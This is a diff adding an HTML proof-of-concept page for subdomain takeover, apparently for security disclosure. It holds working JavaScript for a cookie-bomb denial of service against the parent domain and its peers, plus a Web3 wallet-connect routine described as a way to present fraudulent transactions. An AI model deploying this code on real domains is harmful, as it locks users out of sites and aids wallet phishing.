@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Subdomain Takeover Proof-of-Concept</title>
+<script
+  src="https://code.jquery.com/jquery-3.6.0.slim.min.js"
+  integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI="
+  crossorigin="anonymous"></script>
+
+<style>
+
+.test-section {
+  padding: 1em;
+}
+body {
+  padding: 1em;
+  color: #222222;
+}
+
+</style>
+
+</head>
+<body>
+<h1>Subdomain Takeover Proof-of-Concept</h1>
+<div class="test-section" id="cookie-bomb-section">
+  <h3>Cookie Bomb</h3>
+  <p>A <a href="https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-bomb">cookie bomb</a> will add a large number of big cookies for a domain and related domains, causing a DoS for a user on those domains.</p>
+  <p>Click the following button to cookie bomb this domain, along with peers <button id="cookie-bomb-button">Cookie Bomb</button></p>
+  <p><b>Warning:</b> Clicking on this button will perform a DOS on this domain, making it inaccessible.</p> 
+  <p><b>Access can be restored by clearing the cookies for this domain.</b></p>
+</div>
+<div class="test-section" id="eth-config-section" style="display: none;">
+  <h3>Web3 Wallet Connect</h3>
+  <div id="eth-connect-section">
+    <p>Through included Javascript, it is easy to connect to a user's Web3 wallet and send transactions on behalf of it.</p> 
+    <p>A taken-over domain can present these transactions as legitimate.</p>
+    <p>Click this button to connect your ETH wallet.
+      <button id="eth-connect-button">ETH connect</button>
+    </p>
+  </div>
+  <div id="eth-display-section" style="display: none;">
+    <div id="eth-display-content"></div>
+  </div>
+</div>
+<h2>Have a Nice Day!</h2>
+<img src="https://onepingedangel.com/smiley.png"/>
+<p>@haveaniceday</p>
+
+<script type="text/javascript">
+  $("#cookie-bomb-button").click(function() {
+    var base_domain = "." + document.domain.substr(document.domain.indexOf('.'));
+
+    if (confirm("Are you sure you want to launch the cookie bomb on " + base_domain + "?")) {
+      var pollution = Array(4000).join("a");  
+      for(var i = 1; i < 99 ;i++) {
+        document.cookie = "bomb" + i + "=" + pollution + ";Domain=" + base_domain + ";Path=/";
+      }
+    }
+  });
+</script>
+<script type="text/javascript">
+  if (ethereum !== undefined) {
+
+    function handleAccountsChanged(accounts) {
+      if (accounts.length > 0) {
+        var account = accounts[0];
+        $("#eth-connect-section").hide();
+        $("#eth-display-section").show();
+        $("#eth-display-content").html("<p>Your ETH Wallet is: <b>" + account + "</b></p>");
+      }
+    }
+
+    function checkConnection() {
+      ethereum
+        .request({ method: 'eth_accounts' })
+        .then(handleAccountsChanged)
+        .catch(console.error);
+    }
+
+    $("#eth-config-section").show();
+    checkConnection();
+
+    $("#eth-connect-button").click(function() {
+        ethereum.request({ method: "eth_requestAccounts" }).then(handleAccountsChanged)
+          .catch((err) => {
+              console.error(err);
+          });
+    });
+  }
+</script>
+</body>
+</html>
